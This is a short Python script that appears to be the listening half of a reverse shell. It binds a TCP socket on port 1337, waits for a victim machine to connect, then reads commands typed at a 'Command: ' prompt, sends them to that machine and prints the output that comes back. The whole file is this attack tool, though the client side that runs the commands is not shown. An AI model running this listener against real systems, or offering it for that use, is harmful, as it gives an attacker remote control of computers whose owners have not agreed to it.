import socket as so
Host = ""
Port = 1337

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.setsockopt(so.SOL_SOCKET, so.SO_REUSEADDR, 1)
s.bind((Host, Port))
s.listen(3)
connection, addr = s.accept()
print("Connection to " + addr[0])
data = connection.recv(256)
data = data.decode("utf-8")
print(str(data))
while True:
    cmd = input("Command: ")
    # if cmd is not "cd..":
    connection.send(bytes(cmd, "utf-8"))
    data = connection.recv(256)
    print(data)
    print(data.decode("utf-8"))